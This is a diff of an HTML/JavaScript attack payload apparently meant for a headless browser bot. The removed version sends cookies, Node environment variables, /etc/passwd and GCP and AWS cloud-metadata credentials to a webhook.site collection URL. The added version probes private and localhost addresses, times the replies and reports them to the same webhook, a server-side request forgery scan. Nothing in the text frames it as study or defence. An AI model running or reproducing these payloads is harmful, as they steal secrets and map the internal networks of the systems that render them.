@@ -1,56 +1,24 @@
-<!DOCTYPE html>
-<html>
-<body>
-    <h2>Environment Exfiltration</h2>
-    <script>
-        const webhookUrl = "https://webhook.site/e223390b-32c0-4bfa-ab49-15cc45e09f7a";
+<script>
+    const webhookUrl = "https://webhook.site/e223390b-32c0-4bfa-ab49-15cc45e09f7a";
+    const internalIPs = [
+        "http://10.0.0.1/",
+        "http://10.0.0.2/",
+        "http://172.16.0.1/",
+        "http://192.168.1.1/",
+        "http://127.0.0.1:8080/",
+        "http://[::1]:80/"
+    ];
 
-        // Función para enviar datos al webhook
-        function exfiltrate(data, label) {
-            fetch(`${webhookUrl}?leak=${label}`, {
-                method: 'POST',
-                mode: 'no-cors',
-                body: typeof data === 'string' ? data : JSON.stringify(data)
-            }).catch(() => {});
-        }
-
-        // 1. Enviar datos del navegador/bot
-        exfiltrate({
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            origin: window.location.origin,
-            cookies: document.cookie,
-            time: new Date().toISOString()
-        }, "env_info");
-
-        // 2. Intentar leer variables de entorno (si el bot usa Node.js)
-        try {
-            // En Node.js, las variables de entorno están en process.env
-            if (typeof process !== 'undefined' && process.env) {
-                exfiltrate(process.env, "node_env");
-            }
-        } catch(e) {}
-
-        // 3. Intentar leer el archivo /etc/passwd (si el bot tiene acceso a file://)
-        fetch("file:///etc/passwd")
-            .then(res => res.text())
-            .then(data => exfiltrate(data, "lfi_passwd"))
-            .catch(() => {});
-
-        // 4. Intentar leer los metadatos de la nube (GCP)
-        fetch("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", {
-            headers: { "Metadata-Flavor": "Google" }
-        })
-            .then(res => res.text())
-            .then(data => exfiltrate(data, "gcp_token"))
-            .catch(() => {});
-
-        // 5. Intentar leer los metadatos de AWS
-        fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
-            .then(res => res.text())
-            .then(data => exfiltrate(data, "aws_creds"))
-            .catch(() => {});
-    </script>
-</body>
-</html>
+    internalIPs.forEach(ip => {
+        const start = performance.now();
+        fetch(ip, { mode: 'no-cors' })
+            .then(() => {
+                const time = performance.now() - start;
+                fetch(`${webhookUrl}?ssrf_internal=true&ip=${ip}&time=${time}`);
+            })
+            .catch(() => {
+                const time = performance.now() - start;
+                fetch(`${webhookUrl}?ssrf_internal_fail=true&ip=${ip}&time=${time}`);
+            });
+    });
+</script>
